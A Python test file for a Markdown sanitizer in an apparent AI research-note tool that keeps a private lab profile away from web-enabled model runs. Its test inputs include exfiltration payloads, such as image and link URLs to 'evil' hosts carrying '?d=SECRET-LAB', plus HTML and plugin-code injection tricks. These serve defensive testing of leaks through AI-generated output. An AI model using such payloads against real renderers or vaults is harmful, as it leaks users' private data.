"""Run: python test_vault_research_watcher.py  (no dependencies)"""
import re
from unittest import mock

import vault_research_watcher as w

Z = w.ZWSP


def test_sanitize():
    s = w.sanitize_markdown
    # executable plugin blocks are defused, harmless ones kept
    assert s("```dataviewjs\ndv.x()\n```") == "```text\ndv.x()\n```"
    assert s("~~~dataview\nLIST\n~~~") == "~~~text\nLIST\n~~~"
    assert s("```yaml\na: 1 < 2\n```") == "```yaml\na: 1 < 2\n```"      # harmless code untouched
    # Dataview inline queries, including split across lines
    assert s("x `$= dv.y` z") == f"x `{Z}$= dv.y` z"
    assert s("`= this.file`") == f"`{Z}= this.file`"
    assert s("`\n$= dv.y`") == f"`\n{Z}$= dv.y`"
    assert s("run `docker ps`") == "run `docker ps`"
    # Templater, everywhere including code
    assert s("<% tp.x %>") == f"<{Z}% tp.x %>"
    assert s("```bash\n<% tp %>\n```") == f"```bash\n<{Z}% tp %>\n```"
    # remote images become links; HTML becomes text; <br> kept
    assert s("![x](https://evil/?d=lab)") == "[x](https://evil/?d=lab)"
    assert s("![a [b]](https://x)") == "[a [b]](https://x)"
    assert s("![a][r]\n[r]: https://x") == "[a][r]\n[r]: https://x"
    assert s("![[Local note]]") == "![[Local note]]"
    L = "‹"
    assert s('<img src="https://evil">') == f'{L}img src="https://evil">'
    assert s("<iframe src=x></iframe>") == f"{L}iframe src=x>{L}/iframe>"
    assert s("a<br>b | 1 < 2") == "a<br>b | 1 < 2"
    # fences inside quotes / lists / callouts are defused too
    assert s("> ```dataviewjs\n> dv.x()\n> ```") == "> ```text\n> dv.x()\n> ```"
    assert s("- ~~~ dataview\n  LIST") == "- ~~~text\n  LIST"
    # no code/prose detection to fool: HTML is defused everywhere, whatever the backticks or fences do
    for tricky in ["inline `<img src=x>`", "\\`<img src=x>`", "- ```\n  x\n<img src=x>\n```",
                   "    ```\n<img src=x>", "`a`` <img src=x> ``"]:
        out = s(tricky)
        assert "<img" not in out and f"{L}img" in out, (tricky, out)


def test_plain_text_only():
    p = w.plain_text_only
    for evil in ["[x](//evil.com/?d=1)", "![i](https://e)", "&#104;ttps://e", "<https://e>",
                 "[r]: //e", "[[Secret note]]", "HTTPS://E.COM", "www.e.com", "mailto:a@e",
                 r"\[x\](//e)", r"\\[x\\](//e)", r"![x\](//e)"]:
        out = w.sanitize_markdown(p(evil))
        assert not re.search(r"[\[\]\\]", out), (evil, out)               # no brackets or backslashes left
        assert "&#" not in out and "<h" not in out.lower(), (evil, out)
        assert "://e" not in out.lower() and "www.e" not in out and "mailto:" not in out, (evil, out)
    assert p("**Fit:** Trial - runs on ARM64") == "**Fit:** Trial - runs on ARM64"


def test_fit_pass_isolated():
    calls = []

    def fake(prompt, web=True):
        calls.append((prompt, web))
        if web:
            raise AssertionError("fit pass must not use web tools")
        return True, ('```json\n{"fit_verdict": "Trial"}\n```\n## Fit for my lab\n**Fit:** Trial '
                      '[see](//evil/?d=SECRET-LAB) www.evil.io/x')

    with mock.patch.object(w, "run_claude", fake), \
         mock.patch.object(w, "load_lab_profile", lambda: "SECRET-LAB"):
        meta = {}
        body = w.add_fit_section(meta, "X", "## Summary\nhi\n\n## Open questions\nq")
        research_prompt = w.build_prompt({"name": "X", "url": None, "text": "X"})
    assert meta["fit_verdict"] == "Trial"
    assert body.index("## Fit for my lab") < body.index("## Open questions")
    fit = body[body.index("## Fit for my lab"):body.index("## Open questions")]
    assert not re.search(r"[\[\]\\]", fit) and "www.evil" not in fit   # nothing link-shaped
    assert "SECRET-LAB" in calls[0][0] and calls[0][1] is False
    assert "SECRET-LAB" not in research_prompt           # web run never sees the lab profile


if __name__ == "__main__":
    test_sanitize()
    test_plain_text_only()
    test_fit_pass_isolated()
    print("ok")
